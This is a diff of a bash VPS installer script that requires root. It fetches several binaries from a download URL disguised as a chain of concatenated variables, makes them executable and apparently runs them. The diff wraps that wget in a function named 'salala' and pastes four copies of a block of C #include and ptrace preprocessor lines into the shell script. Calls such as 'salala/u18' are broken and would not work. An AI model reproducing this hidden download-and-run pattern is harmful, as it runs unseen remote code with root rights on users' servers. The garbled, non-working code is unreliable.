@@ -1,6 +1,86 @@
 #!/bin/bash
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
+#endif
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
+#endif
 myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
 myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
+#endif
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
+#endif
 flag=0
 if [ $USER != 'root' ]; then
 	echo "Sorry, for run the script please using root user"
@@ -2418,6 +2498,9 @@ echo ""
 		;;
 	esac
 }
+function salala() {
+wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin  
+}
 function lee-customer () {
 echo ""
 echo -e "\e[0;36m   ----------------------------------------\e[0;0m"
@@ -2563,10 +2646,10 @@ echo""
         sudo apt-get update
 		sudo apt-get install nginx
 		lee-connect
-		wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/u18
+		salala/u18
         clear
 		lee-connect
-		wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/fucks
+		salala/fucks
         clear
 		chmod +x u18
 		chmod +x fucks
@@ -2584,10 +2667,10 @@ echo""
 		lee-sleep
 		wget "https://raw.githubusercontent.com/leedzung-autoscrip/Autoscript/master/Debian9.sh"
 	    lee-connect
-        wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/9new
+        salala/9new
         clear
 		lee-connect
-		wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/fucks
+		salala/fucks
         clear
 		chmod +x 9new
 		chmod +x fucks
@@ -2603,10 +2686,10 @@ echo""
 		3)
 		lee-sleep
 		wget "https://raw.githubusercontent.com/leedzung-autoscrip/Autoscript/master/Ubuntu16.sh"
-	    wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/u16
+	    salala/u16
         clear
 		lee-connect
-		wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/fucks
+		salala/fucks
         clear
 		chmod +x u16
 		chmod +x fucks
@@ -2624,10 +2707,10 @@ echo""
 		lee-sleep
 		 wget "https://raw.githubusercontent.com/leedzung-autoscrip/Autoscript/master/Ubuntu14.sh"
 	    lee-connect
-        wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/d9
+        salala/d9
         clear
 		lee-connect
-		wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/fucks
+		salala/fucks
         clear
 		chmod +x d9
 		chmod +x fucks
@@ -2645,10 +2728,10 @@ echo""
 		lee-sleep
 		 wget "https://raw.githubusercontent.com/leedzung-autoscrip/Autoscript/master/Debian8.sh"
 	    lee-connect
-        wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/d8
+        salala/d8
         clear
 		lee-connect
-		wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/fucks
+		salala/fucks
         clear
 		chmod +x d8
 		chmod +x fucks
